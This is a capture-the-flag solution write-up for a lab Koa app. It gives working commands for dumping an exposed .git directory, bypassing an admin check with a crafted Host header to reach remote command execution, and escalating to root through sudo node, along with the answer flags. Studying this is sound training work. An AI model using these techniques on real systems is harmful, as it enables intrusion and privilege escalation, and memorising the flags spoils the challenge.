## Solution

### FLAG 1 — Git History Leak (200 pts)

The koa-static middleware is misconfigured to serve the app's root directory with `hidden: true` (which serves dotfiles). This exposes the `.git` directory.

```bash
# Confirm .git is exposed
curl http://localhost:4022/.git/HEAD
# → ref: refs/heads/main

# Read the git reflog — credentials appear in a "removed" commit
curl http://localhost:4022/.git/logs/HEAD
```

Look for: `commit: Add deployment config - DEVTOOLS_ADMIN_TOKEN=DUNO{c7306df9d7ba2736d1d3ef73324926ca}`

**FLAG1**: `DUNO{c7306df9d7ba2736d1d3ef73324926ca}`

Alternative — dump the full repo:
```bash
git-dumper http://localhost:4022/.git ./zulu-source
```

---

### FLAG 2 — CVE-2026-27959 Hostname Bypass → RCE (600 pts)

**Step 1: Read the source code**

Since koa-static serves the app root, `app.js` is directly accessible:

```bash
curl http://localhost:4022/app.js
```

Look for:
- A `POST /admin/execute` route guarded by `ctx.hostname !== 'localhost'`
- A monkey-patch of `KoaRequest.hostname` at the top of the file that splits the Host header on `:`

The CVE reference comes from the git log retrieved for FLAG1: one of the commit messages reads `TODO tracked in SEC-2026-441 - review CVE-2026-27959 impact on ctx.hostname before prod deploy`.

**Step 2: Understand CVE-2026-27959**

CVE-2026-27959 is a split-direction bug in Koa's `ctx.hostname` parser. When the Host header contains `@`, the vulnerable code does:

```javascript
// BUG: should be host.split('@').pop() — returns the USERINFO, not the hostname
const beforeAt = host.split('@')[0];
return beforeAt.split(':')[0];
```

This means:
- `Host: CONTAINERIP:4022` → no `@` → normal path → `ctx.hostname = 'CONTAINERIP'` → **DENIED**
- `Host: evil@localhost` → has `@` → buggy path → `'evil'.split(':')[0]` = `'evil'` → **DENIED**
- `Host: localhost:fake@CONTAINERIP:4022` → has `@` → buggy path → `'localhost:fake'.split(':')[0]` = `'localhost'` → **BYPASS** ✓

**Step 3: Verify 403 without bypass**

```bash
curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:4022/admin/execute \
  -H "Content-Type: application/json" \
  -d '{"script":"id"}'
# → 403
```

**Step 4: Exploit CVE-2026-27959**

```bash
# Get the container's Docker network IP
CONTAINER_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' ctf-zulu-koa-devtools)

# Bypass: Host: localhost:fake@CONTAINERIP:4022
curl -s -X POST http://localhost:4022/admin/execute \
  -H "Host: localhost:fake@${CONTAINER_IP}:4022" \
  -H "Content-Type: application/json" \
  -d '{"script": "cat /home/ctfuser/flag.txt"}'
# → {"success":true,"output":"DUNO{4235aa2c56f81381e8d0a0c6ccbc9432}\n"}
```

**FLAG2**: `DUNO{4235aa2c56f81381e8d0a0c6ccbc9432}`

> **Note**: `Host: evil@localhost` does NOT work. The buggy code takes the part *before* `@`, so `evil@localhost` yields `ctx.hostname = 'evil'`. The specific CVE format requires userinfo that begins with `localhost:`.

---

### FLAG 3 — sudo node GTFOBins (800 pts)

**Step 1: Enumerate sudo permissions via the RCE**

```bash
CONTAINER_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' ctf-zulu-koa-devtools)

curl -s -X POST http://localhost:4022/admin/execute \
  -H "Host: localhost:fake@${CONTAINER_IP}:4022" \
  -H "Content-Type: application/json" \
  -d '{"script": "sudo -l"}'
# → (root) NOPASSWD: /usr/local/bin/node
```

**Step 2: GTFOBins — sudo node reads root files**

```bash
# Read /root/flag.txt via sudo node (no shell spawn needed)
curl -s -X POST http://localhost:4022/admin/execute \
  -H "Host: localhost:fake@${CONTAINER_IP}:4022" \
  -H "Content-Type: application/json" \
  -d '{"script": "sudo /usr/local/bin/node -e \"process.stdout.write(require('\''fs'\'').readFileSync('\''/root/flag.txt'\'','\''utf8'\''))\"" }'
```

Or via docker exec:

```bash
# GTFOBins: sudo node spawns root shell
docker exec -it ctf-zulu-koa-devtools bash
sudo /usr/local/bin/node -e 'require("child_process").spawn("/bin/sh",["-i"],{stdio:"inherit"})'
# → # (root shell)
cat /root/flag.txt
```

**FLAG3**: `DUNO{4cb34e5c7b673a9b31249702a7d30a93}`

---